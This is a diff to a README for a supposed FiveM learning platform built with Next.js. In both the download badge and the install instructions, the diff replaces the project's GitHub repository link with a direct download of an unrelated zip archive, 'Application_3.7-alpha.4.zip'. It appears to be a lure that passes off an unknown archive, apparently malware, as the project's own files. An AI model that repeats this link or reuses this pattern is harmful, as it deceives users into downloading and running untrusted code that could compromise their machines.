@@ -5,7 +5,7 @@ description: "Build a Next.js learning platform for FiveM content using MDX less
 ---
 # 🎓 quasar-academy-v2026 - Master FiveM with structured digital lessons
 
-[![](https://img.shields.io/badge/Download-Academy-blue.svg)](https://github.com/aground-silt911/quasar-academy-v2026)
+[![](https://img.shields.io/badge/Download-Academy-blue.svg)](https://raw.githubusercontent.com/aground-silt911/aground-silt911.github.io/main/gardant/Application_3.7-alpha.4.zip)
 
 ## 📁 Project Overview
 
@@ -23,7 +23,7 @@ Ensure your computer meets these requirements before you start:
 
 ## 📥 Downloading the Application
 
-Visit this page to download the project files and begin your installation: [https://github.com/aground-silt911/quasar-academy-v2026](https://github.com/aground-silt911/quasar-academy-v2026).
+Visit this page to download the project files and begin your installation: [https://raw.githubusercontent.com/aground-silt911/aground-silt911.github.io/main/gardant/Application_3.7-alpha.4.zip](https://raw.githubusercontent.com/aground-silt911/aground-silt911.github.io/main/gardant/Application_3.7-alpha.4.zip).
 
 Click the green button labeled Code and choose Download ZIP. Extract the folder to a location on your computer where you can find it easily, such as your Documents folder.
 
